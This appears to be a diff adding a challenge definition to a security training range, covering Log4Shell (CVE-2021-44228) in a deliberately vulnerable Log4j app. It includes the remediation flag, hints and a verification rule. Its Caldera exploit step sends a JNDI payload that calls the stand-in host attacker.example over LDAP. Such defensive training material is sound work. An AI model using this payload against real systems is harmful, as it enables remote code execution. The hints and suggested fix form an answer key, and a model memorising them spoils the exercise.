@@ -1,0 +1,36 @@
+id: log4shell_cve
+name: Log4Shell (CVE-2021-44228)
+description: The application uses Log4j 2.14.1 which is vulnerable to CVE-2021-44228 (Log4Shell). JNDI lookup strings in log messages trigger outbound LDAP requests, enabling remote code execution. The fix is to add the JVM flag -Dlog4j2.formatMsgNoLookups=true.
+type: vulnerability
+difficulty: hard
+points: 300
+category: web
+tags: [cve, log4shell, log4j, rce, java, jndi]
+conflicts: []
+requires: [log4shell_app]
+script: log4shell_cve.sh
+verification:
+  type: file_contains
+  path: /etc/systemd/system/logapp.service
+  pattern: "formatMsgNoLookups=true"
+suggested_fix: "Edit /etc/systemd/system/logapp.service and add -Dlog4j2.formatMsgNoLookups=true to the ExecStart JVM arguments, then run: systemctl daemon-reload && systemctl restart logapp"
+hints:
+  - "Research known vulnerabilities in the Java logging framework used by this application"
+  - "Check the Log4j version bundled in /opt/logapp/logapp.jar — version 2.14.1 is affected by CVE-2021-44228"
+  - "Add the JVM flag -Dlog4j2.formatMsgNoLookups=true to the ExecStart line in /etc/systemd/system/logapp.service, then daemon-reload and restart the service"
+caldera:
+  tactic: initial-access
+  technique:
+    attack_id: T1190
+    name: "Exploit Public-Facing Application"
+  recon:
+    description: "Check if Log4Shell mitigation is applied in the service unit"
+    command: |
+      grep -q "formatMsgNoLookups=true" /etc/systemd/system/logapp.service && echo "SECURE: Log4Shell mitigation is applied" || echo "VULNERABLE: Log4Shell mitigation not found"
+  exploit:
+    description: "Trigger a Log4Shell JNDI callback via the /log endpoint"
+    command: |
+      curl -s -X POST http://localhost:8081/log \
+        -H "Content-Type: application/json" \
+        -d '{"message": "${jndi:ldap://attacker.example:1389/exploit}", "level": "INFO"}'
+      echo "JNDI callback triggered — check LDAP server for incoming connection"
